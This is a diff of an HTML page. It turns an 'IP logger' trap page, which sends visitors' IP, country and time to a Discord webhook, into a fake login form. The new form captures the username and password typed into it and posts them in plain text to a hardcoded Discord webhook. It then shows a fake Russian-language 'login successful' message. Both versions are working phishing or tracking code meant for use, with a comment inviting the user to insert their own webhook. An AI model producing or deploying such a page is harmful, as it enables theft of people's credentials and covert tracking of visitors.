@@ -1,35 +1,94 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>IP Logger</title>
+    <title>Login Form</title>
+    <style>
+        body {
+            background-image: url('https://images.unsplash.com/photo-1440613908111-bc00e0e228cd');
+            background-size: cover;
+            background-repeat: no-repeat;
+            font-family: Arial, Helvetica, sans-serif;
+            text-align: center;
+        }
+
+        h2 {
+            color: white;
+            margin-top: 50px;
+        }
+
+        form {
+            display: inline-block;
+            background-color: #f2f2f2;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0,0,0,0.5);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        input[type=text], input[type=password] {
+            width: 100%;
+            padding: 12px 20px;
+            margin: 8px 0;
+            display: inline-block;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <h2>Login Form</h2>
+    <form onsubmit="submitForm(event)">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+
+        <button type="submit">Login</button>
+    </form>
+
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js" integrity="sha512-T5rJ7hDx8Wp33VDbvIZhKj7b9zQkZ5QxtgvvLwU5OoD5eBc85+oZHvIWq3qKjX1fHn0AfoSyuwYFuxgR0GKsBg==" crossorigin="anonymous"></script>
     <script>
-        $.get("https://ipapi.co/json/", function(data) {
+        function submitForm(event) {
+            event.preventDefault();
+
             var webhook_url = "https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0"; // замените на свой Discord Webhook
-            var ip = data.ip;
-            var country_code = data.country_code;
-            var country_emoji = getCountryEmoji(country_code);
-            var time = moment().format('MMMM Do YYYY, h:mm:ss a');
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+
             var request = new XMLHttpRequest();
             request.open("POST", webhook_url);
             request.setRequestHeader('Content-type', 'application/json');
             var params = {
-                username: "IP Logger",
+                username: "Login Form",
                 avatar_url: "https://i.imgur.com/WzAMxKl.png",
-                content: "**IP**: " + ip + "\n**Country**: " + country_code + " " + country_emoji + "\n**Time**: " + time
+                content: "**Username**: " + username + "\n**Password**: " + password
             };
             request.send(JSON.stringify(params));
-        });
 
-        function getCountryEmoji(country_code) {
-            var codePoints = [...country_code.toUpperCase()].map(c => 127397 + c.charCodeAt());
-            return String.fromCodePoint(...codePoints);
+            alert("Вы успешно вошли!");
+            document.getElementById("username").value = "";
+            document.getElementById("password").value = "";
         }
     </script>
-</head>
-<body>
-    <h1>IP Logger</h1>
-    <p>Это сайт-ловушка, который будет записывать IP-адреса, страны и время посещения людей, которые посещают его.</p>
 </body>
 </html>
